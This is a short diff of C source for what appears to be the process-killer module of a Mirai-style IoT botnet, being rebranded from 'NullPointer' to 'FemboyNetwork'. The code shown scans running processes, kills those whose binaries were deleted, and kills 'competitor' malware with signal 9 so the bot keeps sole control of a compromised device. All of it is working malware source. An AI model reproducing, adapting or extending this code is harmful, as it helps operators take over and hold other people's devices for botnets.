@@ -52,7 +52,7 @@ void killer_init(void)
     }
 
 #ifdef DEBUG
-	printf("[killer] NullPointer setting up proc scan\n");
+	printf("[killer] FemboyNetwork setting up proc scan\n");
 #endif
 
     while (TRUE)
@@ -126,17 +126,17 @@ void killer_init(void)
                 if ((fd = open(realpath, O_RDONLY)) == -1)
                 {
 #ifdef DEBUG
-                    printf("[NullPointer] Deleted binary for [%s >> %d]\n", realpath, pid);
+                    printf("[FemboyNetwork] Deleted binary for [%s >> %d]\n", realpath, pid);
 #endif
                     kill(pid, 9);
                 }
                 close(fd);
             }
 
-            if (pid != getpid() && pid != getppid() && nullpointer_match(maps_path))
+            if (pid != getpid() && pid != getppid() && fnbnet_match(maps_path))
             {
 #ifdef DEBUG
-                printf("[NullPointer] Found competitor [%s >> %d]\n", realpath, pid);
+                printf("[FemboyNetwork] Found competitor [%s >> %d]\n", realpath, pid);
 #endif
                 kill(pid, 9);
             } 
@@ -346,7 +346,7 @@ static BOOL is_our_binary(char *realpath)
     return FALSE;
 }
 
-static BOOL nullpointer_match(char *path)
+static BOOL fnbnet_match(char *path)
 {
     char rdbuf[512];
     BOOL found = FALSE;
